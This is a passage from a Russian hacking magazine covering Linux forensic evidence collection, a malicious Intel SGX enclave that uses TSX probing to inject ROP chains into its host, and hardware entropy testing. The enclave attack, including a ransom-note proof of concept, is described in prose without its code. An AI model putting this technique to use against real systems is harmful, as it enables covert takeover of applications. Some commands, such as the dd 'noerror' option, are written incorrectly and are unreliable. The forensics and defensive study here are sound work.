за изменениями системы в реальном времени.


НЕКОТОРЫЕ ОСОБЕННОСТИ ФОРЕНЗИКИ В LINUX
В прошлой статье, которая была пос вящена кейсу с хищением денежных
средств в ДБО на Windows 10, мы по возможности использовали в качестве
инструментария программы с гра фическим интерфейсом. Если не брать
проприетарные решения, такие, к примеру, как EnCase Forensic или Belkasoft
Evidence Center, то на Linux боль шинство рабочих утилит идет в режиме
командной строки.
  Использование тестовых команд существенно экономит время на манипу‐
ляции с софтом, но, с дру гой стороны, может оказаться слишком сложным
для новичков. Однако форензикой новички обычно и не занимаются! :‐D
  Помимо отдельных утилит, есть целые дистрибутивы, предназначенные
для цифровой криминалистики. Это преж де всего DEFT, CAINE, Sumuri PAL‐
ADIN, Helix, ну и, конечно же, всем известный Kali Linux. Полный обзор дис три‐
бутивов и  тулкитов для форензики можно прочитать в  статье  «Тулкит
для форензики. Выбираем дистрибутив и набор софта для криминалистичес‐
кого анализа».
  Из литературы по форензике в Linux я бы в первую очередь порекомен‐
довал едва ли не единс твенную полноценную книгу об этом. Ее написал
Филип Полстра, а называ ется она Linux Forensics Paperback. Во вторую оче‐
редь — издание UNIX and Linux Forensic Analysis DVD Toolkit Криса Пога и дру‐
гих. Ну и в‐третьих, Digital Forensics with Kali Linux.


ОБЩИЙ ЧЕК-ЛИСТ ПРОВЕРКИ
Для поиска и сбо ра криминалистичес ких доказа тельств мы первым делом
создадим образы (дампы) следующих объектов наших систем:
 • оперативная память (системные и пользовательские процессы, демоны,
   возможно запущенный вредоносный код и так далее);
 • жесткий диск (посекторная копия HDD, включающая удаленные разделы,
   неразмеченные области диска, потертые файлы, скрытые файлы и дирек‐
   тории и прочее);
 • сетевой стек (поднятые коннекты, откры тые порты, «неизвес тные» сер‐
   висы на портах, паразитный трафик).

В рамках самой операционной системы мы будем обращать особое вни‐
мание в первую оче редь:
 • на список поль зователей, груп пы, при вилегии;
 • запущенные от имени root процес сы;
 • задачи, запускаемые по расписанию (cron jobs);
 • файлы с установленным битом SUID и SGID;
 • состав файла /etc/sudoers;
 • скрытые файлы и директории;
 • файлы, открытые на чтение в системе;
 • сетевые интерфейсы, соединения, порты, таблицу маршрутизации;
 • логи iptables, fail2ban (Reports, Alarms, Alerts);
 • конфигурацию /etc/ssh/sshd_config;
 • логи демона Syslog (про верим на типичные алерты);
 • состояние SELinux;
 • список загруженных модулей ядра.

Ну и в качестве допол нитель ной опции можно соб рать контрольные суммы
с основных системных файлов (к примеру, ути литой TripWire), а позже срав‐
нить их с эталонными зна чениями в исходном дистрибутиве. Но этот процесс
весьма нетривиален и требует большого запаса времени и нервных клеток.
Поэтому подробности мы любезно опустим.
  Поскольку железо, на котором крутится вся ферма, находится в надежном
дата‐центре, сразу отметается поиск артефактов, связанных с се тевой ФС
(NFS), локально смонтированными устрой ства ми и подключенными по USB
девайсами.


           WARNING

                       Всегда хорошо обдумывай, какое именно дей‐
                        ствие и для какой цели ты делаешь. Неп равиль‐
                      ное использование приведенных в тексте статьи
                       программ может привести к потере информации
                         (артефактов) или искажению полученных данных
                         (криминалистических доказательств). Ни автор,
                      ни редакция не несут ответственности за любой
                      ущерб, причинен ный при неп равильном исполь‐
                       зовании материала данной статьи.



СНИМАЕМ ОБРАЗ HDD
Посекторную копию жесткого диска вполне мож но  снять, не при бегая
к допол нительным утилитам. Мы будем исполь зовать старую и проверенную
в работе натив ную тул зу dd. Она позволяет соз давать точные побитовые
копии — как целых дисков, так и отдельных разделов и даже просто файлов.


           WARNING

                     Снятие образов дисков и работа с ними штат‐
                    ными средствами системы может привести к неп‐
                      реднамеренной записи, что в серьезной кри‐
                     миналистике  исключено.  Подробности  читай
                        в статье «Тулкит для форензики» (раздел «Как
                      не наследить сле допыту»). Используй команды
                       ниже, только если считаешь, что в твоем случае
                        это допустимо.


Но первоначально запросим у системы полный список разделов с помощью
команды fdisk:


$ fdisk ‐l





                 Просмотр списка файловых систем

Базовый синтаксис dd выглядит так:


$ dd if=<source> of=<destination> bs=<byte size>

К примеру, для создания копии HDD с раз мером клас тера 512 байт:


$ dd if=/dev/sda1 of=/dev/sdb1 bs=512

В процессе копирования HDD могут быть поврежденные сектора. Чтобы
программа не спотыкалась о них и не останавливала работу, необ ходимо
добавить дополнительный ключ -noerror:


$ dd if=/dev/sda1 of=/dev/sdb1 bs=512 noerror




                   Результат работы утилиты dd

Однако лучшие мировые практики — это использовать усовершенс твованный
вариант предыдущей утилиты под названием dcfldd. Эта тул за разработана
в компьютерной судебной лабора тории DCFL и имеет ряд специальных
опций для снятия дампов с целью криминалистического анализа. Например,
dcﬂdd умеет хешировать копиру емые данные и проверять их целос тность.
По ходу дела отоб ражается прогресс соз дания дампа, действия заносятся
в лог, а контрольные суммы MD5 сохраняются в отдельный файл.
  Пример выполнения команды:


$ dcfldd if=/dev/sda1 hash=md5 of=/media/forensic_disk_image.dd bs=
512 noerror





                  Результат работы утилиты dcﬂdd

Вместо консоли при желании можно пользоваться графичес кой версией уже
известной нам по прошлой статье утилиты FTK.


ДЕЛАЕМ ДАМП ОПЕРАТИВНОЙ ПАМЯТИ
Как и в случае с жестким диском, существует несколько способов решить эту
задачу. Сре ди вариантов:
 • использование нативного модуля ядра Linux Memory Extractor (LiME);
 • скрипт Linux Memory Grabber, который не требует установки и который
  можно запускать, к примеру, с флешки;
 • связка утилит lmap и pmem, которые входят в пакет Rekall. Их‐то я и буду
   использовать.

Пара слов о Rekall. Это отдель ная ветвь раз вития известного фреймворка
Volatility Framework, которая написа на на Python и предназначена специально
для включения в форензик‐дистрибутивы, работа ющие с Live CD.
  Переходим в каталог с тулзой и собира ем ее из исходников:


$ cd rekall/tools/linux/
$ make

Грузим драйвер ядра pmem.ko в оперативную память:


$ sudo insmod pmem.ko

Проверяем инициализацию драйвера:


$ sudo lsmod

После этого драйвер создает файл‐контей нер под наш будущий образ RAM:
/dev/pmem.
   Теперь с помощью все той же утилиты dd соз даем сам образ оперативной
памяти системы:


$ dd if=/dev/pmem of=forensic_RAM_image.raw

Ну и после завершения работы выгружа ем драй вер:


$ rmmod pmem

Дело сделано!


СЕТЕВОЙ ТРАФИК НА АНАЛИЗ
Здесь в ходу несколь ко утилит: прежде всего — консольная tcpdump, клас‐
сика жанра Wireshark и опенсорсный фреймворк XPLICO, хотя последний
больше используется для пос леду ющего анализа данных, чем для их пер‐
воначального сбора. Для тех, кто раньше не сталкивался с этими программа‐
ми, у нас есть неплохие обучающие статьи по ним: «Проводим аудит сетевого
трафика с помощью tcpdump» и «Как использовать возможности фильтров
отображения Wireshark по максимуму».
   Начнем с tcpdump. Базовый вызов команды выглядит следующим обра‐
зом:


$ tcpdump <опции> <фильтр>

А вот некоторые наиболее важные опции:
 • i интерфейс — зада ет интерфейс, с которого необходимо анализи‐
   ровать трафик;
 • n — отключает преобразование IP в доменные имена;
 • e — включает вывод данных канального уровня (например, MAC‐адреса);
 • v — вывод допол нитель ной информации (TTL, опции IP);
 • w имя_файла — задает имя файла, в который нужно сохранять соб‐
   ранную информацию (дамп);
 • r имя_файла — чтение (загрузка) дампа из заданного файла;
 • q — переводит tcpdump в «бесшумный режим», в котором пакет анализи‐
   руется на транспортном уровне (про токолы  TCP, UDP, ICMP), а не
   на сетевом (протокол IP).

Дампим весь входящий тра фик, иду щий из интернета на наш сервер:


$ tcpdump ‐s 0 ‐i eth0 ‐n ‐nn ‐ttt dst host <ip‐адрес нашего хоста>
‐w forensic_cap.pcap

Пример создания дампа сетевого тра фика по протоколам FTP или SSH
на интерфейсе eth0:


$ tcpdump ‐s 0 port ftp or ssh ‐i eth0 ‐w forensic_cap.pcap

Дампим вообще все, что идет на интерфейс eth0:


$ tcpdump ‐w forensic_cap ‐i eth0





                    Результат работы tcpdump

Еде одна годная для наших целей утилита — это TCPﬂow. По сути, более
продвинутый вариант tcpdump, который поддерживает еще больше парамет‐
ров фильтрации и возможность восста навливать «сломанные» пакеты.
   Если TCPﬂow по умол чанию нет в системе, то для начала ставь пакет
tcpflow.
  Далее базовый синтаксис команды выглядит так:


$ tcpflow [опции] [выражение] [хост]

А вот описание опций:
 • c — только консоль ная печать (не соз давать файлы);
 • d — уровень отладки (по умолчанию 1);
 • e — выводить каждый поток чередующимися цветами (синий — кли‐
   ент‐сервер, красный — сервер‐клиент, зеленый — неизвестно);
 • i — сетевой интерфейс для прослушива ния;
 • r — чтение пакетов из выходного фай ла tcpdump;
 • s — удалить непечатаемые символы (будут заменяться точками).

Пример сбора данных, иду щих из внешней сети на наш сервер:


$ tcpflow ‐ce host  <IP‐адрес нашего хоста>

Собираем весь трафик HTTP в нашей сети:


$ tcpflow ‐ce port 80

Дамп данных сетевого потока в локальную папку:


$ mkdir tcpflowdata
$ cd tcpflowdata
$ tcpflow host <IP‐адрес целевой машины>

Теперь в директорию /tcpflowdata будут складывать ся файлы с содержани‐
ем сетевых подклю чений.  Все,  что нам потом  останется сделать, —
это перекинуть их для анализа в парсер.





                    Результат работы TCPﬂow


ПОЛУЧАЕМ ДОСТУП К СОБРАННЫМ ДАННЫМ
Образы жестких дисков и оперативки готовы. Теперь нам нужно их смон‐
тировать на исследовательской машине, чтобы начать искать и изучать арте‐
факты. С образом HDD все просто, выходной файл, полученный в результате
работы dd или dcﬂdd, можно легко подмонти ровать как новое устройство.
  Синтаксис команды mount выглядит так:


$ mount ‐o,ro,noatime,loop,offset= <смещение по началу партиции в
байтах> <имя файла образа> <точка монтирования>

К примеру, чтобы смонтировать ранее снятый дамп HDD, нужно выполнить
команду


$ mount ‐o,ro,loop forensic_disk_image.dd /mnt/temp/

Образ RAM будем открывать с помощью  Volatility Framework, но об этом
поговорим чуть ниже, в разделе «Поиск артефактов».
  Файл .pcap с дампом сетевых подключений открывается в Wireshark
или XPLICO. Но я предпочитаю пользоваться сервисами с полуавтоматичес‐
ким парсингом, например PacketTotal, Pcap Analyzer или платным CloudShark.


ДРУГИЕ ПОЛЕЗНЫЕ КОМАНДЫ
Вот несколько команд, которые помогут дособ рать все, что мы могли пропус‐
тить. Некоторые вещи — просто на всякий случай, потому что это не займет
много времени.


Мгно вен но получить состояние системы и основные харак терис-
тики кон фигурации
#!/bin/bash
dmesg > dmesg.txt
cat /proc/mounts > proc_mounts.txt


// Собираем контрольные суммы со всех смонтированных на текущий
момент устройств
for p in $(md5sum /proc/mounts /proc/*/mounts | sort | uniq ‐d ‐w 32
| awk '{print $2}'); do
cat $p > ${p////_};
done


cat /proc/mdstat > proc_mdstat.txt
lspci > lspci.txt
uname ‐a > uname_a.txt
uptime > uptime.txt


Пе ремон тировать все файловые системы только для чте ния
Для каждой файловой системы, которую мы будем ковырять, перемонтируем
в режиме ro:


// set mountpoint


MOUNTPOINT=/home
mount ‐o remount,ro ${MOUNTPOINT}

И создадим timestamp или временную шкалу:


find "${MOUNTPOINT}" ‐xdev ‐print0 | xargs ‐0 stat ‐c "%Y %X %Z %A
%U %G %n" >> timestamps.dat


По лучить состояние существу ющих под ключений и откры тых
сокетов
// ‐‐verbose ‐‐wide ‐‐extend ‐‐timers ‐‐program ‐‐numeric (‐‐listen
ing)


netstat ‐v ‐W ‐e ‐o ‐p ‐n     > netstat_vWeopn.txt
netstat ‐v ‐W ‐e ‐o ‐p ‐n ‐l  > netstat_vWeopnl.txt


// same without ‐‐numeric
netstat ‐v ‐W ‐e ‐o ‐p        > netstat_vWeop.txt
netstat ‐v ‐W ‐e ‐o ‐p ‐l     > netstat_vWeopl.txt


Те кущий дамп кеша ARP
arp ‐n > arp_n.txt
ip neigh show > ip_neigh_show.txt


Захватить состояние текущих правил сетево го фильтра iptable
// ‐‐verbose ‐‐numeric ‐‐exact ‐‐list ‐‐table
for table in filter nat mangle raw; do iptables ‐v ‐n ‐x ‐L ‐t ${
table} >        iptables_vnxL_t${table}.txt; done
for table in filter mangle raw; do ip6tables ‐n ‐t ${table} ‐L ‐v ‐x
> ip6tables_nt_${table}.txt; done
for table in filter nat broute; do ebtables ‐t ${table} ‐L ‐‐Lmac2
‐‐Lc > ebtables_L_Lmac_Lc_t_${table}.txt; done


Дамп ipsets (обыч но используется fail2ban и firewalld)
ipset list > ipset_list.txt


Сохранить таб лицу про цессов
ps auxwwwe > ps_auxwwwe.txt

Другой вариант с более читабель ным выводом:


pstree ‐a ‐l ‐p ‐u    > pstree_alpu.txt
pstree ‐a ‐l ‐p ‐u ‐Z > pstree_alpuZ.txt


Сохранить исходное местополо жение исполняемо го файла по PID
ls ‐l /proc/${PID}/ > proc_${PID}_ls_l.txt
cat /proc/${PID}/exe > proc_${PID}_exe


Посмотреть все откры тые в системе файлы
Если файл был удален, то команда ls добавит флаг (deleted) к име ни фай ла
назначения. К содержимому все еще можно будет получить доступ, используя
символические ссылки в /proc/${PID}/fd. Это час то помогает в работе
с вредоносами, написанными на интерпретиру емых языках, таких как Perl
и Python. Поэтому для дальнейшего анализа мы сохраним все открытые фай‐
лы:


ls ‐l /proc/${PID}/fd > proc_${PID}_fd.txt


// copy interesting open files, substitute MYFD with file descriptor
number


MYFD=1234
cat /proc/${PID}/${MYFD}> proc_${PID}_fd_${MYFD}


ВЫВОДЫ
Теперь у нас есть все необ ходимое для дальнейшего анализа. В следующей,
заключительной статье цикла я покажу, что делать с полученными данными,
чтобы найти в них артефакты. А что бы было веселее, я припас для тебя инте‐
ресный кейс с поиском заразы, которая завелась на серверах хос тинг‐про‐
вайдера. В общем, оставайся с нами!
ВЗЛОМ

ВРЕДОНОСНЫЙ КОД
   В ОВЕЧЬЕЙ ШКУРЕ
          КАК РАБОТАЕТ АТАКА
           НА АНКЛАВ SGX





За годы хаотичной эво люции набор команд
ассемблера x86‐64 стал порождать самые
причудливые сочетания. Сегодня мы рас‐
смотрим  творческий  подход  к  исполь‐      ЭкспертАнтонпо информационнойКарев
зованию  TSX‐инструкций  изнутри  анкла‐         безопасности.профессиональныхОбласть
вов —  защищенных  участков  памяти.      интересовразведка, аналитика— технологическаяв сфере
                                                                       ИБ и искусственный
Результатом  будет  рабочий  эксплоит,               интеллект
                                                                                              vedacoder@mail.ru
который поз волит выполнять любой код
с привилегиями хост‐приложения.


Итак, что нам недоступно в анклаве? Мы не можем делать системные вызовы.
Мы не можем выполнять операции вво да‐вывода. Мы не знаем базового
адреса сегмента кода хост‐приложения. Мы не можем переходить к коду
хост‐приложения при помощи jmp и call. Мы не имеем представления
о структуре адресного прос транства, которой руководству ется хост‐приложе‐
ние (например, какие именно страницы промап пены или что за данные раз‐
мещены на этих страницах). Мы даже не можем попросить опе раци онную
систему промап пить нам кусок памяти хост‐приложе ния (например, через
proc/pid/maps).


             INFO

                    Логичней всего думать о технологии SGX (Soft‐
                       ware Guard Extensions) и анклавах как о «песоч‐
                      нице   наоборот».  В   sandbox‐приложениях,
                         как правило, запускается потенциально опасный
                          код, который требуется изолировать от операци‐
                      онной системы и сторонних программ. Анклав же,
                       напротив, исходит из того, что окружение уже
                     может быть скомпромети ровано злоумышленни‐
                        ками, и поэто му предотвращает любой несанкци‐
                      онированный доступ извне. Подробности ты най‐
                     дешь на сайте Intel.


Наивные попытки прочитать вслепую произволь ную область памяти хост‐при‐
ложения рано или поздно приведут к при нудительному завершению анклав‐
ной программы (и скорее рано, чем поз дно). Так происходит всякий раз, ког‐
да запрашиваемая анклавом область вир туаль ного адресного пространства
оказывается недоступной хост‐приложению. О воз можнос ти записать «что‐то
свое» даже заикаться смешно.
  Поэтому  принято  считать,  что  анклав  способен лишь  обслу живать
хост‐приложение и что анклав не может проявлять собственную инициативу,
в том числе злонамеренную. А значит, для создателей вирусов практической
ценности он не представляет. Это поспешное предположение стало одной
из причин того, почему защита анклава несимметрична: код хост‐приложения
не может получать доступ к его памяти, тогда как анклавный код может читать
и писать по любому адресу памяти хост‐приложения.
  Поэтому случись так, что вредонос ному анклаву удастся делать про‐
извольные системные вызовы от имени хост‐приложения, выпол нять про‐
извольный код, сканировать память и находить в ней пригодные для злоупот‐
ребления  ROP‐цепочки, —  и  он сможет  захватить  пол ный  контроль
над хост‐приложением в стелс‐режиме. Он будет способен не только красть
и шифровать поль зовательские файлы, но и действовать от его имени. Нап‐
ример, отправлять фишинговые пись ма или про водить DoS‐атаки. При этом
даже самые современные защитные механизмы, такие как стековые канарей‐
ки и санитарная обработка адресов, окажутся бес сильными.
  В статье я покажу нес колько приемов, при помощи которых злодеи пре‐
одолевают перечисленные огра ничения и используют SGX в своих корыс тных
интересах при проведении ROP‐атак. Делается это либо для выполнения
произвольного кода, замас кированного под про цесс хост‐приложения (ана‐
логично process hollowing, который час то используется малварью), либо
для маскировки уже готовой малвари — чтобы изба виться от преследований
со стороны антивирусов и других защитных механизмов.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ВЫРЫВАЯСЬ НА ОПЕРАТИВНЫЙ ПРОСТОР
Поскольку анклав не зна ет, какие диапазоны виртуального адресного прос‐
транства доступны хост‐приложению, и так как при попытке чтения недос‐
тупного адреса анклав принудитель но завершается, перед злоумышленни ком
встает первоочередная  задача: найти надежный способ  сканирования.
Это позволит создать карту дос тупных виртуаль ных адресов. Атакующий
решает эту задачу через нецелевое использование технологии Intel TSX.


             INFO

                           Transactional Synchronization Extensions (TSX) —
                       аппарат ный способ повышения производитель‐
                       ности при син хронизации обращений к памяти
                        в  многопоточных  приложениях.  В  отличие
                         от мьютек сов TSX при попытке доступа к данным
                      не блокирует выполнение потока до момента зах‐
                          вата, так же он устраняет возможность дедлока
                      при   некорректной   реализации.  Подробнее
                      про TSX — на сайте Intel.


Нам инте ресен один из побочных эффектов этой технологии: если функцию
доступа к памяти поместить в транзакцию, то исклю чения, возникающие из‐за
обращения к недопустимым адресам, подавляются на уровне железа и воз‐
вращаются  к  поль зовательскому  коду,  минуя  операционную  сис тему.
При попытке доступа к недействитель ному адресу памяти прерывается толь‐
ко текущая транзакция, а не вся анклавная программа. Таким образом, TSX
позволяет анклаву безопасно получить дос туп к любой ячейке памяти — и без
риска обрушения.
   Если указанный адрес дос тупен хост‐приложению, обращение чаще всего
завершается успехом. В редких случаях мы можем потерпеть неудачу из‐за
внешних воздействий, таких как прерывания (нап ример, прерывания пла‐
нировщика), вытеснение из кеша или одновременное изме нение ячейки
памяти несколькими процес сами. В такой ситуации TSX возвращает код
ошибки, по которому мож но определить, что сбой носит временный характер
и достаточно лишь переза пус тить транзакцию.
   Если же указанный адрес недоступен хост‐приложению, TSX подавляет
возникшее исклю чение (ОС не уведомляется) и отме няет транзакцию.
При этом анклаву возвра щается код ошиб ки, что бы он мог среагировать
на факт отмены. Эти коды указывают на то, что рассматриваемый адрес
недоступен хост‐приложению.





У такого манипулирования транзакци ями изнутри анклава есть при ятная
для преступника особенность: поскольку на момент выполнения анклавного
кода большинство аппаратных счетчиков произво дительнос ти не обновля‐
ются, по ним невозможно отслеживать выполняемые внутри анклава TSX‐опе‐
рации. Таким образом, зло намеренные махина ции остаются полностью
невидимыми для ОС.
  Кроме того, поскольку описанный хак не полагается на какие‐либо сис‐
темные вызовы, его нельзя ни обнаружить, ни предотвратить простой бло‐
кировкой (что обыч но дает положительный резуль тат при борьбе с «охотой
на яйца»).
  Злоумышленник же при меняет такой метод для поис ка в коде хост‐при‐
ложения гаджетов, пригодных для формирова ния ROP‐цепочки. При этом ему
не нужно зондировать каждый адрес. Достаточно проверить по одному адре‐
су с каждой страницы виртуального адресного пространства. На практике
зондирование всех 16 Гбайт памяти занимает около 45 мин (на Intel i7‐
6700K). В итоге взломщик получа ет список исполняемых страниц, пригодных
для конструирования ROP‐цепочки.


УКРЕПЛЯЕМ ПОЗИЦИИ
Для реализации анклавного варианта ROP‐атаки злодею нужно най ти дос‐
тупные для записи неиспользуемые учас тки памяти хост‐приложения. В даль‐
нейшем они будут задейство ваны для инжектирова ния под дельного стеково‐
го фрейма и полезной нагрузки (шелл‐кода). Так как анклав неспособен тре‐
бовать от хост‐приложения выделить себе память нап рямую, злоумышленник
может попытаться использовать не по наз начению уже выделенную. Разуме‐
ется, если ему удастся найти подходящие учас тки и не обрушить анклав.
  Для этого эксплуатирует ся еще один побочный эффект TSX. Как и в пре‐
дыдущем случае, сперва зондиру ется адрес на предмет существования,
а затем проверяется, доступна ли для записи соответствующая этому адресу
страница. При этом преступники применя ют следующий метод: функция
записи помещается в транзакцию, и, после того как она выполнилась (но
еще до того, как завершилась), операция при нудительно обры вается (explicit
abort).
   Глядя на код возврата из транзакции, злоумышленник понимает, могла ли
попытка вообще быть успешной. Если это explicit abort, то опе рацию можно
проводить до конца. В любом дру гом случае страница доступна только
для чтения.





В этом заключается вто рая приятная для ата кующего особенность TSX: пос‐
кольку все команды записи в память фиксируются только для успешных тран‐
закций, принудительное завершение гарантирует, что зондируемая ячейка
памяти остается без изменений.


             INFO

                    Вообще говоря, технология TSX оказалась весь‐
                    ма  богатой  на  недокументированные особен‐
                         ности.  Ранние  реализации  (на  процессорах
                         Haswell и Broadwell) специалистам Intel пришлось
                      отключать посредством обновления. Также тебе
                     может быть любопытно взглянуть на материалы
                         атаки DrK, которая тоже эксплуатирует механизм
                        транзакций для обхода ядра ОС, но уже в другой
                         ситуации.



ШТУРВАЛ НА СЕБЯ!
При выполнении ROP‐ата ки из анклава (в отличие от традиционных атак этого
типа) можно  получить  контроль над  регистром  RIP без  эксплу атации
каких‐либо допол нитель ных ошибок в программе (перепол нение буфера
и подобные). Преступник способен напрямую перезаписы вать значение
регистра RIP, хранящееся в кадре стека. Например, указать в нем собствен‐
ную ROP‐цепочку.
  Однако если цепочка длинная, то перезапись большого куска сте ка
хост‐приложения может привести к повреждению данных и к неожиданному
поведению программы. Злодея, стремящегося про водить свою атаку скрыт‐
но, такое положение вещей вряд ли устроит. Поэто му он создает себе вре‐
менный кадр и хранит последова тельность отскоков в нем. Поддельный кадр
стека размещается в произвольном месте, дос тупном для записи. При этом
подлинный стек остается нетронутым.





ЧИСТО ГИПОТЕТИЧЕСКИ
Рассмотрим сценарий потенциальной атаки с применением описанных выше
методов. Сперва вредонос ный анклав зондирует адреса в памяти и проверя‐
ет их на возможность чтения. Далее он ищет в хост‐приложе нии подходящие
ROP‐гаджеты.





Затем анклавный код идентифицирует в памяти свобод ные учас тки, пригод‐
ные для записи и инжектирова ния полезной нагрузки.





Следующим шагом анклав создает ROP‐цепочку из обнаруженных на первом
этапе гаджетов и инжектирует ее в стек хост‐при ложения.





Наконец, когда хост‐приложение натыкается на созданную таким образом
ROP‐цепочку, начинается выполнение полезной наг рузки, с привилегиями
хост‐приложения и с воз можностью обращений к системным вызовам.


PROOF OF CONCEPT
Как  только  хост‐приложение  передает  управление  анклаву  через
какой‐нибудь ECALL (не подоз ревая, что тот содержит в себе угрозу), пос‐
ледний приступает к поиску в памяти хост‐приложения свобод ного места
для инжектирования кода (сво бодными считаются те ячей ки, которые содер‐
жат нулевое значение). Затем анклав отыскива ет в хост‐приложении исполня‐
емые страницы и генерирует ROP‐цепочку, которая создает новый файл
с именем RANSOM в текущей директории (разумеется, при реальной атаке
анклав шифрует существующие пользователь ские файлы) и отображает
сообщение с требова нием  выкупа. При этом хост‐приложение наивно
полагает, что анклав просто складывает два чис ла. Осталось посмотреть,
как это выглядит в коде.
  Для удобства восприятия введем через определения некоторую мнемони‐
ку.





Сохраним исходные значения регистров RSP и RBP, чтобы после выпол нения
полезной нагрузки восста новить нормальную работу хост‐при ложе ния.





Далее выбираем подходящие ROP‐гаджеты.





Находим место для инжектирования полезной нагрузки.





Наконец, строим ROP‐цепочку.





Вот таким образом технология SGX, изна чально призванная защитить прог‐
раммы и ценные данные от посторонних, экс плуатируется злоумышленни‐
ками для реализации пря мо противо полож ных целей.
ТРЮКИ



  В ПОИСКАХ
 СЛУЧАЙНОСТИ

        ИЩЕМ ЭНТРОПИЮ
       НА МИКРОСХЕМЕ, ЧТОБЫ
       ПОВЫСИТЬ СТОЙКОСТЬ
           ШИФРОВ





Хорошо, когда под рукой есть аппа ратный
генератор случайных чисел или хотя бы
/dev/urandom. Но что делать, если их нет,
а чуть‐чуть случайности прив нести в про‐
шивку своего умно го устройства все‐таки               faberge                                                                                  Программирую
хочется? В  такой  ситуации  сто ит  вни‐      наблюдаямикроконтроллеры,фазовый переход
мательней прис мотреться к самым обыч‐       на границеshirous@yandex.ruкода и железа.
ным вещам: например, шумам в аналого‐
во‐цифровом преобразователе.


Если ты читал мою предыду щую статью, то помнишь, что нам тогда пот‐
ребовался аппаратный генера тор случай ных чисел (TRNG) для инициали‐
зации пула энтропии внутри библиотеки SSL. Тогда мы никак не проверяли
последовательность на выходе генератора, считая по умол чанию, что она
нам подходит. Возможно, с тех пор тебя интересовал вопрос, насколько
это предположение соот ветс твовало действительности и как вообще можно
оценить качество энтропии.


             INFO

                      Если ты читал «Крип тономикон» Нила Стивенсона,
                         то наверняка помнишь, как главный герой романа
                      собирал энтропию для шифрования сооб щений
                       программой «Ордо», хаотично нажимая клавиши
                       на клавиатуре ноутбука. Тот редкий случай, когда
                      описание технических подробностей в художес‐
                        твенной  литературе  соответствует  реальности
                      и не заставля ет специалистов тяжело вздыхать.


Кроме того, я постараюсь рас ска зать, что еще можно использовать в качес‐
тве источника для генерации случайных чисел. Аппа ратные ГСЧ в современ‐
ных микроконтроллерах на архитектуре ARM — вещь не сказать чтобы редкая,
но и не самая распространенная.





  Узнать, присутствует ли TRNG в твоем МК, можно по этой таблице.
  Модельный ряд Н7 почему‐то еще не добави ли

Увы, даже внутри одного семейства далеко не у всех микросхем одинаковая
периферия. Например, микроконтроллер F746NG имеет модуль TRNG, но не
CRYP или HASH (их получили более старшие товарищи, которые мощнее и,
разумеется, дороже). Порой быва ет, что «камень» подходит по всем парамет‐
рам и по периферии, за исклю чением одной‐двух мелочей. В таком случае
можно попробовать реализовать недостающую функциональность своими
силами.


           WARNING

                     Следует помнить, что, если речь идет об особо
                      важных дан ных, экономить нельзя ни в коем слу‐
                          чае! Нужно использовать  только проверенные
                       генераторы (желательно накап ливать энтропию
                       сразу  с нескольких) и комплексно подходить
                          к проблеме безопасности.



ИНСТРУМЕНТЫ
Старые знакомые…
Из железа нам потребуется оценочная пла та F746G Discovery. Не буду пов‐
торяться и вновь останавливать ся на ее характерис тиках. Замечу только, что
в этот раз из перифе рии мы будем использовать ГСЧ, АЦП и еще слот для mi‐
croSD. С помощью замеча тельной биб лиотеки FatFs полученные данные
будут записываться на карту памяти для даль нейшей обработки и анализа
на компьютере.
  Настроить плату для работы с карточка ми формата SD можно по при‐
мерам в докумен тации STMicroelectronics (пункт STM32F7 Series Device Sup‐
port & Drivers) либо в дополнительных биб лиотеках к проекту STM32duino.
  Обрати внимание, что интерфейсом для общения с микроконтрол лером
тут служит четырехбитный SDIO, а не обычный SPI, и это гораздо быстрее
(карточки SD поддерживают SPI в режиме обратной совместимости). Кроме
того, ST во всех своих примерах использует старую версию библиотеки FatFs.
Ты можешь взять драйверы от ST, а за акту альной версией обратиться на сайт
автора, чтобы потом уже собрать все самос тоятельно.
  Прежней осталась и IDE — это Arduino с установленным пакетом STM32‐
duino. Кстати, с момента выхода прошлой статьи у них появилась вер‐
сия 1.5.0, не забудь обно виться!


...и новые лица
Появление комплек та ста тистичес ких тес тов в статье об энтропии сложно
назвать неожиданным. Случайность слиш ком важна, чтобы взять первый
попавшийся набор чисел (нап ример, из ячеек RAM или значение сис темного
таймера) и скор мить программе. Если ты интересовался темой ГСЧ, то
наверняка встре чал в интернете несколько пакетов тестов — DIEHARD(ER),
CRYPT‐X, TestU01 и про чие. Примечательно, что сам Дональд Кнут уделил
внимание этой проб леме, и во втором томе его монументального (и нес коль‐
ко занудного) труда по алго ритмам ты можешь най ти перечень тестов и много
другой полезной информа ции.
  Впрочем, я решил остановить свой выбор на пакете от NIST (The National
Institute of Standards and Technology) преимущес твенно по двум при чинам.
Во‐первых, этот набор тестов хорошо и исчерпывающе документирован
(PDF) за исклю чением одно го важного момента, о котором я расскажу ниже.
Во‐вторых, его использовали в ST для оценки ГСЧ на собс твенных микрокон‐
троллерах, поэтому мне было любопытно сравнить, насколько сойдутся наши
результаты. Подробнее об их тес тирова нии ты можешь прочитать в соответс‐
твующем аппноуте (PDF). Если тебе больше интересен практический аспект
применения STS (Statistical Test Suite), то рекомендую начать именно с пос‐
леднего документа.
   Что касается установки и использования са мого пакета, то тут все три‐
виально. Просто разархивируй папку, укажи свой компилятор в makeﬁle
и собери программу assess из исходников. В зависимости от настроек сооб‐
щений твоего компилятора ты можешь увидеть на экране несколько предуп‐
реждений — игнорируй их, на результат они не повлияют.
  А вот здесь уже интересней, и это то, о чем я говорил ранее. Кажется, что
логично проверить работу готовой прог раммы на тех данных, результат
которых заранее известен, правда? Специально для этой цели в приложении
Б документации (с. 107) указаны рас четные зна чения для примеров из папки
data. Там лежат тестовые файлы, предназна ченные для тестирования нашего
комплекта тестов (как звучит‐то, м‐м‐м). Если ты сейчас запус тишь прог‐
рамму assess и укажешь путь, например, к data → data.pi, то увидишь зна‐
чения как будто похожие, но все‐таки дру гие. Спокойно, так и должно быть!
  Я потратил приличное количес тво времени, раз за разом проверяя
и перепроверяя результаты, чтобы выяс нить, в чем при чина такого поведе‐
ния. К счастью, более опыт ные люди вовремя подсказали мне, что на самом
деле имеет место банальный рассин хрон документации и кода. Зная, что
искать, легко заметить, что даже способ отоб ражения соотношений в выводе
был изменен.
   Так что самое главное — это чтобы итоги первого теста у тебя выглядели
как на скриншоте.





                     Вывод для чис ла π


             INFO

                     Возможно, тебе будет любопытно  узнать, что
                        некото рые свойства числа π не изучены до сих
                         пор. Например, совершенно непонятно, почему
                   цифры в представлении числа π встречаются
                      примерно с одинаковой вероятностью. Впрочем,
                          так  как сама  эта последовательность  весьма
